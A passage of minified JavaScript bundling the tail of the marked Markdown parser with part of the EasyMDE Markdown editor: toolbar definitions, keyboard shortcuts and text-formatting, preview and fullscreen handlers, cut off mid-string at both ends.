X=r({},F);if(X.async=$e.defaults.async||X.async||!1,F.extensions&&(F.extensions.forEach(function(te){if(!te.name)throw new Error("extension name required");if(te.renderer){var Ce=le.renderers[te.name];Ce?le.renderers[te.name]=function(){for(var je=arguments.length,Re=new Array(je),Be=0;Be<je;Be++)Re[Be]=arguments[Be];var Ue=te.renderer.apply(this,Re);return Ue===!1&&(Ue=Ce.apply(this,Re)),Ue}:le.renderers[te.name]=te.renderer}if(te.tokenizer){if(!te.level||te.level!=="block"&&te.level!=="inline")throw new Error("extension level must be 'block' or 'inline'");le[te.level]?le[te.level].unshift(te.tokenizer):le[te.level]=[te.tokenizer],te.start&&(te.level==="block"?le.startBlock?le.startBlock.push(te.start):le.startBlock=[te.start]:te.level==="inline"&&(le.startInline?le.startInline.push(te.start):le.startInline=[te.start]))}te.childTokens&&(le.childTokens[te.name]=te.childTokens)}),X.extensions=le),F.renderer&&function(){var te=$e.defaults.renderer||new vt,Ce=function(Be){var Ue=te[Be];te[Be]=function(){for(var Le=arguments.length,qe=new Array(Le),fe=0;fe<Le;fe++)qe[fe]=arguments[fe];var Et=F.renderer[Be].apply(te,qe);return Et===!1&&(Et=Ue.apply(te,qe)),Et}};for(var je in F.renderer)Ce(je);X.renderer=te}(),F.tokenizer&&function(){var te=$e.defaults.tokenizer||new Q,Ce=function(Be){var Ue=te[Be];te[Be]=function(){for(var Le=arguments.length,qe=new Array(Le),fe=0;fe<Le;fe++)qe[fe]=arguments[fe];var Et=F.tokenizer[Be].apply(te,qe);return Et===!1&&(Et=Ue.apply(te,qe)),Et}};for(var je in F.tokenizer)Ce(je);X.tokenizer=te}(),F.hooks&&function(){var te=$e.defaults.hooks||new bt,Ce=function(Be){var Ue=te[Be];bt.passThroughHooks.has(Be)?te[Be]=function(Le){if($e.defaults.async)return Promise.resolve(F.hooks[Be].call(te,Le)).then(function(fe){return Ue.call(te,fe)});var qe=F.hooks[Be].call(te,Le);return Ue.call(te,qe)}:te[Be]=function(){for(var Le=arguments.length,qe=new Array(Le),fe=0;fe<Le;fe++)qe[fe]=arguments[fe];var Et=F.hooks[Be].apply(te,qe);return Et===!1&&(Et=Ue.apply(te,qe)),Et}};for(var je in F.hooks)Ce(je);X.hooks=te}(),F.walkTokens){var G=$e.defaults.walkTokens;X.walkTokens=function(te){var Ce=[];return Ce.push(F.walkTokens.call(this,te)),G&&(Ce=Ce.concat(G.call(this,te))),Ce}}$e.setOptions(X)})},$e.walkTokens=function(le,ue){for(var H=[],L=function(){var te=X.value;switch(H=H.concat(ue.call($e,te)),te.type){case"table":{for(var Ce=u(te.header),je;!(je=Ce()).done;){var Re=je.value;H=H.concat($e.walkTokens(Re.tokens,ue))}for(var Be=u(te.rows),Ue;!(Ue=Be()).done;)for(var Le=Ue.value,qe=u(Le),fe;!(fe=qe()).done;){var Et=fe.value;H=H.concat($e.walkTokens(Et.tokens,ue))}break}case"list":{H=H.concat($e.walkTokens(te.items,ue));break}default:$e.defaults.extensions&&$e.defaults.extensions.childTokens&&$e.defaults.extensions.childTokens[te.type]?$e.defaults.extensions.childTokens[te.type].forEach(function(gt){H=H.concat($e.walkTokens(te[gt],ue))}):te.tokens&&(H=H.concat($e.walkTokens(te.tokens,ue)))}},F=u(le),X;!(X=F()).done;)L();return H},$e.parseInline=nn(Ke.lexInline,ut.parseInline),$e.Parser=ut,$e.parser=ut.parse,$e.Renderer=vt,$e.TextRenderer=lt,$e.Lexer=Ke,$e.lexer=Ke.lex,$e.Tokenizer=Q,$e.Slugger=Tt,$e.Hooks=bt,$e.parse=$e;var Hn=$e.options,Un=$e.setOptions,zn=$e.use,fr=$e.walkTokens,it=$e.parseInline,Wn=$e,Tr=ut.parse,Wi=Ke.lex;e.Hooks=bt,e.Lexer=Ke,e.Parser=ut,e.Renderer=vt,e.Slugger=Tt,e.TextRenderer=lt,e.Tokenizer=Q,e.getDefaults=m,e.lexer=Wi,e.marked=$e,e.options=Hn,e.parse=Wn,e.parseInline=it,e.parser=Tr,e.setOptions=Un,e.use=zn,e.walkTokens=fr})(Sk);var Vs=kr,Z_=X_,tm=Sk.marked,Nk=/Mac/.test(navigator.platform),J_=new RegExp(/(<a.*?https?:\/\/.*?[^a]>)+?/g),Ru={toggleBold:zf,toggleItalic:Wf,drawLink:eh,toggleHeadingSmaller:Ou,toggleHeadingBigger:Vf,drawImage:th,toggleBlockquote:Yf,toggleOrderedList:Zf,toggleUnorderedList:Xf,toggleCodeBlock:$f,togglePreview:sh,toggleStrikethrough:qf,toggleHeading1:Gf,toggleHeading2:Qf,toggleHeading3:Kf,toggleHeading4:Jg,toggleHeading5:ex,toggleHeading6:tx,cleanBlock:Jf,drawTable:nh,drawHorizontalRule:rh,undo:ih,redo:ah,toggleSideBySide:Hl,toggleFullScreen:ps},eI={toggleBold:"Cmd-B",toggleItalic:"Cmd-I",drawLink:"Cmd-K",toggleHeadingSmaller:"Cmd-H",toggleHeadingBigger:"Shift-Cmd-H",toggleHeading1:"Ctrl+Alt+1",toggleHeading2:"Ctrl+Alt+2",toggleHeading3:"Ctrl+Alt+3",toggleHeading4:"Ctrl+Alt+4",toggleHeading5:"Ctrl+Alt+5",toggleHeading6:"Ctrl+Alt+6",cleanBlock:"Cmd-E",drawImage:"Cmd-Alt-I",toggleBlockquote:"Cmd-'",toggleOrderedList:"Cmd-Alt-L",toggleUnorderedList:"Cmd-L",toggleCodeBlock:"Cmd-Alt-C",togglePreview:"Cmd-P",toggleSideBySide:"F9",toggleFullScreen:"F11"},tI=function(e){for(var t in Ru)if(Ru[t]===e)return t;return null},k0=function(){var e=!1;return function(t){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(t)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw-(n|u)|c55\/|capi|ccwa|cdm-|cell|chtm|cldc|cmd-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc-s|devi|dica|dmob|do(c|p)o|ds(12|-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(-|_)|g1 u|g560|gene|gf-5|g-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd-(m|p|t)|hei-|hi(pt|ta)|hp( i|ip)|hs-c|ht(c(-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i-(20|go|ma)|i230|iac( |-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|-[a-w])|libw|lynx|m1-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|-([1-8]|c))|phil|pire|pl(ay|uc)|pn-2|po(ck|rt|se)|prox|psio|pt-g|qa-a|qc(07|12|21|32|60|-[2-7]|i-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h-|oo|p-)|sdk\/|se(c(-|0|1)|47|mc|nd|ri)|sgh-|shar|sie(-|m)|sk-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h-|v-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl-|tdg-|tel(i|m)|tim-|t-mo|to(pl|sh)|ts(70|m-|m3|m5)|tx-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas-|your|zeto|zte-/i.test(t.substr(0,4)))&&(e=!0)}(navigator.userAgent||navigator.vendor||window.opera),e};function nI(e){for(var t;(t=J_.exec(e))!==null;){var n=t[0];if(n.indexOf("target=")===-1){var r=n.replace(/>$/,' target="_blank">');e=e.replace(n,r)}}return e}function rI(e){for(var t=new DOMParser,n=t.parseFromString(e,"text/html"),r=n.getElementsByTagName("li"),a=0;a<r.length;a++)for(var l=r[a],u=0;u<l.children.length;u++){var f=l.children[u];f instanceof HTMLInputElement&&f.type==="checkbox"&&(l.style.marginLeft="-1.5em",l.style.listStyleType="none")}return n.documentElement.innerHTML}function Ak(e){return Nk?e=e.replace("Ctrl","Cmd"):e=e.replace("Cmd","Ctrl"),e}function iI(e,t,n,r){var a=Ld(e,!1,t,n,"button",r);a.classList.add("easymde-dropdown"),a.onclick=function(){a.focus()};var l=document.createElement("div");l.className="easymde-dropdown-content";for(var u=0;u<e.children.length;u++){var f=e.children[u],h;typeof f=="string"&&f in ls?h=Ld(ls[f],!0,t,n,"button",r):h=Ld(f,!0,t,n,"button",r),h.addEventListener("click",function(m){m.stopPropagation()},!1),l.appendChild(h)}return a.appendChild(l),a}function Ld(e,t,n,r,a,l){e=e||{};var u=document.createElement(a);if(e.attributes)for(var f in e.attributes)Object.prototype.hasOwnProperty.call(e.attributes,f)&&u.setAttribute(f,e.attributes[f]);var h=l.options.toolbarButtonClassPrefix?l.options.toolbarButtonClassPrefix+"-":"";u.className=h+e.name,u.setAttribute("type",a),n=n??!0,e.text&&(u.innerText=e.text),e.name&&e.name in r&&(Ru[e.name]=e.action),e.title&&n&&(u.title=sI(e.title,e.action,r),Nk&&(u.title=u.title.replace("Ctrl",""),u.title=u.title.replace("Alt",""))),e.title&&u.setAttribute("aria-label",e.title),e.noDisable&&u.classList.add("no-disable"),e.noMobile&&u.classList.add("no-mobile");var m=[];typeof e.className<"u"&&(m=e.className.split(" "));for(var x=[],g=0;g<m.length;g++){var b=m[g];b.match(/^fa([srlb]|(-[\w-]*)|$)/)?x.push(b):u.classList.add(b)}if(u.tabIndex=-1,x.length>0){for(var E=document.createElement("i"),C=0;C<x.length;C++){var P=x[C];E.classList.add(P)}u.appendChild(E)}return typeof e.icon<"u"&&(u.innerHTML=e.icon),e.action&&t&&(typeof e.action=="function"?u.onclick=function(O){O.preventDefault(),e.action(l)}:typeof e.action=="string"&&(u.onclick=function(O){O.preventDefault(),window.open(e.action,"_blank")})),u}function aI(){var e=document.createElement("i");return e.className="separator",e.innerHTML="|",e}function sI(e,t,n){var r,a=e;return t&&(r=tI(t),n[r]&&(a+=" ("+Ak(n[r])+")")),a}function Pa(e,t){t=t||e.getCursor("start");var n=e.getTokenAt(t);if(!n.type)return{};for(var r=n.type.split(" "),a={},l,u,f=0;f<r.length;f++)l=r[f],l==="strong"?a.bold=!0:l==="variable-2"?(u=e.getLine(t.line),/^\s*\d+\.\s/.test(u)?a["ordered-list"]=!0:a["unordered-list"]=!0):l==="atom"?a.quote=!0:l==="em"?a.italic=!0:l==="quote"?a.quote=!0:l==="strikethrough"?a.strikethrough=!0:l==="comment"?a.code=!0:l==="link"&&!a.image?a.link=!0:l==="image"?a.image=!0:l.match(/^header(-[1-6])?$/)&&(a[l.replace("header","heading")]=!0);return a}var ab="";function ps(e){var t=e.codemirror;t.setOption("fullScreen",!t.getOption("fullScreen")),t.getOption("fullScreen")?(ab=document.body.style.overflow,document.body.style.overflow="hidden"):document.body.style.overflow=ab;var n=t.getWrapperElement(),r=n.nextSibling;if(r.classList.contains("editor-preview-active-side"))if(e.options.sideBySideFullscreen===!1){var a=n.parentNode;t.getOption("fullScreen")?a.classList.remove("sided--no-fullscreen"):a.classList.add("sided--no-fullscreen")}else Hl(e);if(e.options.onToggleFullScreen&&e.options.onToggleFullScreen(t.getOption("fullScreen")||!1),typeof e.options.maxHeight<"u"&&(t.getOption("fullScreen")?(t.getScrollerElement().style.removeProperty("height"),r.style.removeProperty("height")):(t.getScrollerElement().style.height=e.options.maxHeight,e.setPreviewMaxHeight())),e.toolbar_div.classList.toggle("fullscreen"),e.toolbarElements&&e.toolbarElements.fullscreen){var l=e.toolbarElements.fullscreen;l.classList.toggle("active")}}function zf(e){ix(e,"bold",e.options.blockStyles.bold)}function Wf(e){ix(e,"italic",e.options.blockStyles.italic)}function qf(e){ix(e,"strikethrough","~~")}function $f(e){var t=e.options.blockStyles.code;function n(ye){if(typeof ye!="object")throw"fencing_line() takes a 'line' object (not a line number, or line text).  Got: "+typeof ye+": "+ye;return ye.styles&&ye.styles[2]&&ye.styles[2].indexOf("formatting-code-block")!==-1}function r(ye){return ye.state.base.base||ye.state.base}function a(ye,J,pe,oe,ae){pe=pe||ye.getLineHandle(J),oe=oe||ye.getTokenAt({line:J,ch:1}),ae=ae||!!pe.text&&ye.getTokenAt({line:J,ch:pe.text.length-1});var xe=oe.type?oe.type.split(" "):[];return ae&&r(ae).indentedCode?"indented":xe.indexOf("comment")===-1?!1:r(oe).fencedChars||r(ae).fencedChars||n(pe)?"fenced":"single"}function l(ye,J,pe,oe){var ae=J.line+1,xe=pe.line+1,q=J.line!==pe.line,We=oe+`
`,Q=`
`+oe;q&&xe++,q&&pe.ch===0&&(Q=oe+`
`,xe--),ms(ye,!1,[We,Q]),ye.setSelection({line:ae,ch:0},{line:xe,ch:0})}var u=e.codemirror,f=u.getCursor("start"),h=u.getCursor("end"),m=u.getTokenAt({line:f.line,ch:f.ch||1}),x=u.getLineHandle(f.line),g=a(u,f.line,x,m),b,E,C;if(g==="single"){var P=x.text.slice(0,f.ch).replace("`",""),O=x.text.slice(f.ch).replace("`","");u.replaceRange(P+O,{line:f.line,ch:0},{line:f.line,ch:99999999999999}),f.ch--,f!==h&&h.ch--,u.setSelection(f,h),u.focus()}else if(g==="fenced")if(f.line!==h.line||f.ch!==h.ch){for(b=f.line;b>=0&&(x=u.getLineHandle(b),!n(x));b--);var N=u.getTokenAt({line:b,ch:1}),T=r(N).fencedChars,A,_,M,R;n(u.getLineHandle(f.line))?(A="",_=f.line):n(u.getLineHandle(f.line-1))?(A="",_=f.line-1):(A=T+`
`,_=f.line),n(u.getLineHandle(h.line))?(M="",R=h.line,h.ch===0&&(R+=1)):h.ch!==0&&n(u.getLineHandle(h.line+1))?(M="",R=h.line+1):(M=T+`
`,R=h.line+1),h.ch===0&&(R-=1),u.operation(function(){u.replaceRange(M,{line:R,ch:0},{line:R+(M?0:1),ch:0}),u.replaceRange(A,{line:_,ch:0},{line:_+(A?0:1),ch:0})}),u.setSelection({line:_+(A?1:0),ch:0},{line:R+(A?1:-1),ch:0}),u.focus()}else{var B=f.line;if(n(u.getLineHandle(f.line))&&(a(u,f.line+1)==="fenced"?(b=f.line,B=f.line+1):(E=f.line,B=f.line-1)),b===void 0)for(b=B;b>=0&&(x=u.getLineHandle(b),!n(x));b--);if(E===void 0)for(C=u.lineCount(),E=B;E<C&&(x=u.getLineHandle(E),!n(x));E++);u.operation(function(){u.replaceRange("",{line:b,ch:0},{line:b+1,ch:0}),u.replaceRange("",{line:E-1,ch:0},{line:E,ch:0})}),u.focus()}else if(g==="indented"){if(f.line!==h.line||f.ch!==h.ch)b=f.line,E=h.line,h.ch===0&&E--;else{for(b=f.line;b>=0;b--)if(x=u.getLineHandle(b),!x.text.match(/^\s*$/)&&a(u,b,x)!=="indented"){b+=1;break}for(C=u.lineCount(),E=f.line;E<C;E++)if(x=u.getLineHandle(E),!x.text.match(/^\s*$/)&&a(u,E,x)!=="indented"){E-=1;break}}var U=u.getLineHandle(E+1),$=U&&u.getTokenAt({line:E+1,ch:U.text.length-1}),Y=$&&r($).indentedCode;Y&&u.replaceRange(`
`,{line:E+1,ch:0});for(var ne=b;ne<=E;ne++)u.indentLine(ne,"subtract");u.focus()}else{var Z=f.line===h.line&&f.ch===h.ch&&f.ch===0,me=f.line!==h.line;Z||me?l(u,f,h,t):ms(u,!1,["`","`"])}}function Yf(e){rx(e.codemirror,"quote")}function Ou(e){ja(e.codemirror,"smaller")}function Vf(e){ja(e.codemirror,"bigger")}function Gf(e){ja(e.codemirror,void 0,1)}function Qf(e){ja(e.codemirror,void 0,2)}function Kf(e){ja(e.codemirror,void 0,3)}function Jg(e){ja(e.codemirror,void 0,4)}function ex(e){ja(e.codemirror,void 0,5)}function tx(e){ja(e.codemirror,void 0,6)}function Xf(e){var t=e.codemirror,n="*";["-","+","*"].includes(e.options.unorderedListStyle)&&(n=e.options.unorderedListStyle),rx(t,"unordered-list",n)}function Zf(e){rx(e.codemirror,"ordered-list")}function Jf(e){lI(e.codemirror)}function eh(e){var t=e.options,n="https://";if(t.promptURLs){var r=prompt(t.promptTexts.link,n);if(!r)return!1;n=Dk(r)}_k(e,"link",t.insertTexts.link,n)}function th(e){var t=e.options,n="https://";if(t.promptURLs){var r=prompt(t.promptTexts.image,n);if(!r)return!1;n=Dk(r)}_k(e,"image",t.insertTexts.image,n)}function Dk(e){return encodeURI(e).replace(/([\\()])/g,"\\$1")}function nx(e){e.openBrowseFileWindow()}function Lk(e,t){var n=e.codemirror,r=Pa(n),a=e.options,l=t.substr(t.lastIndexOf("/")+1),u=l.substring(l.lastIndexOf(".")+1).replace(/\?.*$/,"").toLowerCase();if(["png","jpg","jpeg","gif","svg","apng","avif","webp"].includes(u))ms(n,r.image,a.insertTexts.uploadedImage,t);else{var f=a.insertTexts.link;f[0]="["+l,ms(n,r.link,f,t)}e.updateStatusBar("upload-image",e.options.imageTexts.sbOnUploaded.replace("#image_name#",l)),setTimeout(function(){e.updateStatusBar("upload-image",e.options.imageTexts.sbInit)},1e3)}function nh(e){var t=e.codemirror,n=Pa(t),r=e.options;ms(t,n.table,r.insertTexts.table)}function rh(e){var t=e.codemirror,n=Pa(t),r=e.options;ms(t,n.image,r.insertTexts.horizontalRule)}function ih(e){var t=e.codemirror;t.undo(),t.focus()}function ah(e){var t=e.codemirror;t.redo(),t.focus()}function Hl(e){var t=e.codemirror,n=t.getWrapperElement(),r=n.nextSibling,a=e.toolbarElements&&e.toolbarElements["side-by-side"],l=!1,u=n.parentNode;r.classList.contains("editor-preview-active-side")?(e.options.sideBySideFullscreen===!1&&u.classList.remove("sided--no-fullscreen"),r.classList.remove("editor-preview-active-side"),a&&a.classList.remove("active"),n.classList.remove("CodeMirror-sided")):(setTimeout(function(){t.getOption("fullScreen")||(e.options.sideBySideFullscreen===!1?u.classList.add("sided--no-fullscreen"):ps(e)),r.classList.add("editor-preview-active-side")},1),a&&a.classList.add("active"),n.classList.add("CodeMirror-sided"),l=!0);var f=n.lastChild;if(f.classList.contains("editor-preview-active")){f.classList.remove("editor-preview-active");var h=e.toolbarElements.preview,m=e.toolbar_div;h.classList.remove("active"),m.classList.remove("disabled-for-preview")}var x=function(){var b=e.options.previewRender(e.value(),r);b!=null&&(r.innerHTML=b)};if(t.sideBySideRenderingFunction||(t.sideBySideRenderingFunction=x),l){var g=e.options.previewRender(e.value(),r);g!=null&&(r.innerHTML=g),t.on("update",t.sideBySideRenderingFunction)}else t.off("update",t.sideBySideRenderingFunction);t.refresh()}function sh(e){var t=e.codemirror,n=t.getWrapperElement(),r=e.toolbar_div,a=e.options.toolbar?e.toolbarElements.preview:!1,l=n.lastChild,u=t.getWrapperElement().nextSibling;if(u.classList.contains("editor-preview-active-side")&&Hl(e),!l||!l.classList.contains("editor-preview-full")){if(l=document.createElement("div"),l.className="editor-preview-full",e.options.previewClass)if(Array.isArray(e.options.previewClass))for(var f=0;f<e.options.previewClass.length;f++)l.classList.add(e.options.previewClass[f]);else typeof e.options.previewClass=="string"&&l.classList.add(e.options.previewClass);n.appendChild(l)}l.classList.contains("editor-preview-active")?(l.classList.remove("editor-preview-active"),a&&(a.classList.remove("active"),r.classList.remove("disabled-for-preview"))):(setTimeout(function(){l.classList.add("editor-preview-active")},1),a&&(a.classList.add("active"),r.classList.add("disabled-for-preview")));var h=e.options.previewRender(e.value(),l);h!==null&&(l.innerHTML=h)}function ms(e,t,n,r){if(!e.getWrapperElement().lastChild.classList.contains("editor-preview-active")){var a,l=n[0],u=n[1],f={},h={};Object.assign(f,e.getCursor("start")),Object.assign(h,e.getCursor("end")),r&&(l=l.replace("#url#",r),u=u.replace("#url#",r)),t?(a=e.getLine(f.line),l=a.slice(0,f.ch),u=a.slice(f.ch),e.replaceRange(l+u,{line:f.line,ch:0})):(a=e.getSelection(),e.replaceSelection(l+a+u),f.ch+=l.length,f!==h&&(h.ch+=l.length)),e.setSelection(f,h),e.focus()}}function ja(e,t,n){if(!e.getWrapperElement().lastChild.classList.contains("editor-preview-active")){for(var r=e.getCursor("start"),a=e.getCursor("end"),l=r.line;l<=a.line;l++)(function(u){var f=e.getLine(u),h=f.search(/[^#]/);t!==void 0?h<=0?t=="bigger"?f="###### "+f:f="# "+f:h==6&&t=="smaller"?f=f.substr(7):h==1&&t=="bigger"?f=f.substr(2):t=="bigger"?f=f.substr(1):f="#"+f:h<=0?f="#".repeat(n)+" "+f:h==n?f=f.substr(h+1):f="#".repeat(n)+" "+f.substr(h+1),e.replaceRange(f,{line:u,ch:0},{line:u,ch:99999999999999})})(l);e.focus()}}function rx(e,t,n){if(!e.getWrapperElement().lastChild.classList.contains("editor-preview-active")){for(var r=/^(\s*)(\*|-|\+|\d*\.)(\s+)/,a=/^\s*/,l=Pa(e),u=e.getCursor("start"),f=e.getCursor("end"),h={quote:/^(\s*)>\s+/,"unordered-list":r,"ordered-list":r},m=function(C,P){var O={quote:">","unordered-list":n,"ordered-list":"%%i."};return O[C].replace("%%i",P)},x=function(C,P){var O={quote:">","unordered-list":"\\"+n,"ordered-list":"\\d+."},N=new RegExp(O[C]);return P&&N.test(P)},g=function(C,P,O){var N=r.exec(P),T=m(C,b);return N!==null?(x(C,N[2])&&(T=""),P=N[1]+T+N[3]+P.replace(a,"").replace(h[C],"$1")):O==!1&&(P=T+" "+P),P},b=1,E=u.line;E<=f.line;E++)(function(C){var P=e.getLine(C);l[t]?P=P.replace(h[t],"$1"):(t=="unordered-list"&&(P=g("ordered-list",P,!0)),P=g(t,P,!1),b+=1),e.replaceRange(P,{line:C,ch:0},{line:C,ch:99999999999999})})(E);e.focus()}}function _k(e,t,n,r){if(!(!e.codemirror||e.isPreviewActive())){var a=e.codemirror,l=Pa(a),u=l[t];if(!u){ms(a,u,n,r);return}var f=a.getCursor("start"),h=a.getCursor("end"),m=a.getLine(f.line),x=m.slice(0,f.ch),g=m.slice(f.ch);t=="link"?x=x.replace(/(.*)[^!]\[/,"$1"):t=="image"&&(x=x.replace(/(.*)!\[$/,"$1")),g=g.replace(/]\(.*?\)/,""),a.replaceRange(x+g,{line:f.line,ch:0},{line:f.line,ch:99999999999999}),f.ch-=n[0].length,f!==h&&(h.ch-=n[0].length),a.setSelection(f,h),a.focus()}}function ix(e,t,n,r){if(!(!e.codemirror||e.isPreviewActive())){r=typeof r>"u"?n:r;var a=e.codemirror,l=Pa(a),u,f=n,h=r,m=a.getCursor("start"),x=a.getCursor("end");l[t]?(u=a.getLine(m.line),f=u.slice(0,m.ch),h=u.slice(m.ch),t=="bold"?(f=f.replace(/(\*\*|__)(?![\s\S]*(\*\*|__))/,""),h=h.replace(/(\*\*|__)/,"")):t=="italic"?(f=f.replace(/(\*|_)(?![\s\S]*(\*|_))/,""),h=h.replace(/(\*|_)/,"")):t=="strikethrough"&&(f=f.replace(/(\*\*|~~)(?![\s\S]*(\*\*|~~))/,""),h=h.replace(/(\*\*|~~)/,"")),a.replaceRange(f+h,{line:m.line,ch:0},{line:m.line,ch:99999999999999}),t=="bold"||t=="strikethrough"?(m.ch-=2,m!==x&&(x.ch-=2)):t=="italic"&&(m.ch-=1,m!==x&&(x.ch-=1))):(u=a.getSelection(),t=="bold"?(u=u.split("**").join(""),u=u.split("__").join("")):t=="italic"?(u=u.split("*").join(""),u=u.split("_").join("")):t=="strikethrough"&&(u=u.split("~~").join("")),a.replaceSelection(f+u+h),m.ch+=n.length,x.ch=m.ch+u.length),a.setSelection(m,x),a.focus()}}function lI(e){if(!e.getWrapperElement().lastChild.classList.contains("editor-preview-active"))for(var t=e.getCursor("start"),n=e.getCursor("end"),r,a=t.line;a<=n.line;a++)r=e.getLine(a),r=r.replace(/^[ ]*([# ]+|\*|-|[> ]+|[0-9]+(.|\)))[ ]*/,""),e.replaceRange(r,{line:a,ch:0},{line:a,ch:99999999999999})}function hf(e,t){if(Math.abs(e)<1024)return""+e+t[0];var n=0;do e/=1024,++n;while(Math.abs(e)>=1024&&n<t.length);return""+e.toFixed(1)+t[n]}function Ik(e,t){for(var n in t)Object.prototype.hasOwnProperty.call(t,n)&&(t[n]instanceof Array?e[n]=t[n].concat(e[n]instanceof Array?e[n]:[]):t[n]!==null&&typeof t[n]=="object"&&t[n].constructor===Object?e[n]=Ik(e[n]||{},t[n]):e[n]=t[n]);return e}function ki(e){for(var t=1;t<arguments.length;t++)e=Ik(e,arguments[t]);return e}function sb(e){var t=/[a-zA-Z0-9_\u00A0-\u02AF\u0392-\u03c9\u0410-\u04F9]+|[\u4E00-\u9FFF\u3400-\u4dbf\uf900-\ufaff\u3040-\u309f\uac00-\ud7af]+/g,n=e.match(t),r=0;if(n===null)return r;for(var a=0;a<n.length;a++)n[a].charCodeAt(0)>=19968?r+=n[a].length:r+=1;return r}var Dt={bold:"fa fa-bold",italic:"fa fa-italic",strikethrough:"fa fa-strikethrough",heading:"fa fa-header fa-heading","heading-smaller":"fa fa-header fa-heading header-smaller","heading-bigger":"fa fa-header fa-heading header-bigger","heading-1":"fa fa-header fa-heading header-1","heading-2":"fa fa-header fa-heading header-2","heading-3":"fa fa-header fa-heading header-3",code:"fa fa-code",quote:"fa fa-quote-left","ordered-list":"fa fa-list-ol","unordered-list":"fa fa-list-ul","clean-block":"fa fa-eraser",link:"fa fa-link",image:"fa fa-image","upload-image":"fa fa-image",table:"fa fa-table","horizontal-rule":"fa fa-minus",preview:"fa fa-eye","side-by-side":"fa fa-columns",fullscreen:"fa fa-arrows-alt",guide:"fa fa-question-circle",undo:"fa fa-undo",redo:"fa fa-repeat fa-redo"},ls={bold:{name:"bold",action:zf,className:Dt.bold,title:"Bold",default:!0},italic:{name:"italic",action:Wf,className:Dt.italic,title:"Italic",default:!0},strikethrough:{name:"strikethrough",action:qf,className:Dt.strikethrough,title:"Strikethrough"},heading:{name:"heading",action:Ou,className:Dt.heading,title:"Heading",default:!0},"heading-smaller":{name:"heading-smaller",action:Ou,className:Dt["heading-smaller"],title:"Smaller Heading"},"heading-bigger":{name:"heading-bigger",action:Vf,className:Dt["heading-bigger"],title:"Bigger Heading"},"heading-1":{name:"heading-1",action:Gf,className:Dt["heading-1"],title:"Big Heading"},"heading-2":{name:"heading-2",action:Qf,className:Dt["heading-2"],title:"Medium Heading"},"heading-3":{name:"heading-3",action:Kf,className:Dt["heading-3"],title:"Small Heading"},"separator-1":{name:"separator-1"},code:{name:"code",action:$f,className:Dt.code,title:"Code"},quote:{name:"quote",action:Yf,className:Dt.quote,title:"Quote",default:!0},"unordered-list":{name:"unordered-list",action:Xf,className:Dt["unordered-list"],title:"Generic List",default:!0},"ordered-list":{name:"ordered-list",action:Zf,className:Dt["ordered-list"],title:"Numbered List",default:!0},"clean-block":{name:"clean-block",action:Jf,className:Dt["clean-block"],title:"Clean block"},"separator-2":{name:"separator-2"},link:{name:"link",action:eh,className:Dt.link,title:"Create Link",default:!0},image:{name:"image",action:th,className:Dt.image,title:"Insert Image",default:!0},"upload-image":{name:"upload-image",action:nx,className:Dt["upload-image"],title:"Import an image"},table:{name:"table",action:nh,className:Dt.table,title:"Insert Table"},"horizontal-rule":{name:"horizontal-rule",action:rh,className:Dt["horizontal-rule"],title:"Insert Horizontal Line"},"separator-3":{name:"separator-3"},preview:{name:"preview",action:sh,className:Dt.preview,noDisable:!0,title:"Toggle Preview",default:!0},"side-by-side":{name:"side-by-side",action:Hl,className:Dt["side-by-side"],noDisable:!0,noMobile:!0,title:"Toggle Side by Side",default:!0},fullscreen:{name:"fullscreen",action:ps,className:Dt.fullscreen,noDisable:!0,noMobile:!0,title:"Toggle Fullscreen",default:!0},"separator-4":{name:"separator-4"},guide:{name:"guide",action:"https://www.markdownguide.org/basic-syntax/",className:Dt.guide,noDisable:!0,title:"Markdown Guide",default:!0},"separator-5":{name:"separator-5"},undo:{name:"undo",action:ih,className:Dt.undo,noDisable:!0,title:"Undo"},redo:{name:"redo",action:ah,className:Dt.redo,noDisable:!0,title:"Redo"}},oI={link:["[","](#url#)"],image:["![","](#url#)"],uploadedImage:["![](#url#)",""],table:["",`

| Column 1 | Column 2 | Column 3 |
| -------- | -------- | -------- |
| Text     | Text     | Text     |

`],horizontalRule:["",`

-----

